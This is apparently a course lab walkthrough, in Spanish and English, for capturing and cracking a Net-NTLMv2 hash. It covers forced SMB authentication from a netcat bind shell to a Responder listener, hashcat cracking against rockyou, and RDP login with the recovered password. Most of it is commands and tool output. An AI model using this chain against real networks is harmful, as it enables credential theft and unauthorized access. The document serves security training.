# Walk: Password Attacks - Cracking Net-NTLMv2 - VM #1

## Fecha: 26/02/2025
## Host: Windows
## IP: 192.168.130.211
## Objetivo
Follow the steps outlined in this section to obtain the Net-NTLMv2 hash in Responder. Crack it and use it to connect to VM #1 (FILES01) with RDP. Find the flag on _paul_'s desktop. Attention: If the bind shell is terminated it may take up to 1 minute until it is accessible again.
## Herramientas
1. netcat
2. responder
3. hashcat
4. xfreerdp
## Procedimiento y comandos
#### Paso 1: Obtenemos el hash del usuario _paul_
1. Generamos un bind shell con nc:
`nc 192.168.130.211 4444`
2. Configuramos _**responder**_
`ip a`
`responder -I tun0`
```
 .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  ...
[+] Listening for events... 
```
3. En el bind shell de nc:
```
C:\Windows\system32>dir \\192.168.45.189\test
dir \\192.168.45.189\test
Access is denied.

C:\Windows\system32>
```
4. Observamos el responder:
```
[SMB] NTLMv2-SSP Client   : 192.168.130.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:82ef3be0521d976d:C8FFA129A5F7C6F8FAF29D5EA97F7CDE:010100000000000080E13B163C88DB01A8C91F571DB4C8E6000000000200080054004A003900490001001E00570049004E002D005900410035004C005600480049004200440043004C0004003400570049004E002D005900410035004C005600480049004200440043004C002E0054004A00390049002E004C004F00430041004C000300140054004A00390049002E004C004F00430041004C000500140054004A00390049002E004C004F00430041004C000700080080E13B163C88DB010600040002000000080030003000000000000000000000000020000057D4762E3364543316FA74E458E5E2BEB2713D04F1CDDFA5C6C158250C36EFAB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380039000000000000000000 
```
#### Paso 2: Crackeamos el hash
1. Colocamos el hash en un archivo _.hash_
```
echo "paul::FILES01:82ef3be0521d976d:C8FFA129A5F7C6F8FAF29D5EA97F7CDE:010100000000000080E13B163C88DB01A8C91F571DB4C8E6000000000200080054004A003900490001001E00570049004E002D005900410035004C005600480049004200440043004C0004003400570049004E002D005900410035004C005600480049004200440043004C002E0054004A00390049002E004C004F00430041004C000300140054004A00390049002E004C004F00430041004C000500140054004A00390049002E004C004F00430041004C000700080080E13B163C88DB010600040002000000080030003000000000000000000000000020000057D4762E3364543316FA74E458E5E2BEB2713D04F1CDDFA5C6C158250C36EFAB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380039000000000000000000" > paul.hash
```
2. Buscamos el modo de hashcat para crackear el hash.
```
hashcat -h | grep "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
> 5600 | NetNTLMv2                                                  | Network Protocol
3. Crackeamos el hash:
```
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force

PAUL::FILES01:82ef3be0521d976d:c8ffa129a5f7c6f8faf29d5ea97f7cde:010100000000000080e13b163c88db01a8c91f571db4c8e6000000000200080054004a003900490001001e00570049004e002d005900410035004c005600480049004200440043004c0004003400570049004e002d005900410035004c005600480049004200440043004c002e0054004a00390049002e004c004f00430041004c000300140054004a00390049002e004c004f00430041004c000500140054004a00390049002e004c004f00430041004c000700080080e13b163c88db010600040002000000080030003000000000000000000000000020000057d4762e3364543316fa74e458e5e2beb2713d04f1cddfa5c6c158250c36efab0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100380039000000000000000000:123Password123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: PAUL::FILES01:82ef3be0521d976d:c8ffa129a5f7c6f8faf2...000000
Time.Started.....: Wed Feb 26 10:54:15 2025, (21 secs)
Time.Estimated...: Wed Feb 26 10:54:36 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   685.8 kH/s (8.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13336576/14344385 (92.97%)
Rejected.........: 0/13336576 (0.00%)
Restore.Point....: 13328384/14344385 (92.92%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123gd123gd -> 12359367
Hardware.Mon.#1..: Temp: 56c Util: 84%
```
> password: **_123Password123_**
#### Paso 3: Obtenemos el flag
1. Nos conectamos por _**RDP**_ al host Windows con el usuario _paul_
   - `xfreerdp /v:192.168.130.211 /u:paul /p:123Password123 +clipboard /cert:ignore`
> El flag esta en el desktop del usuario.
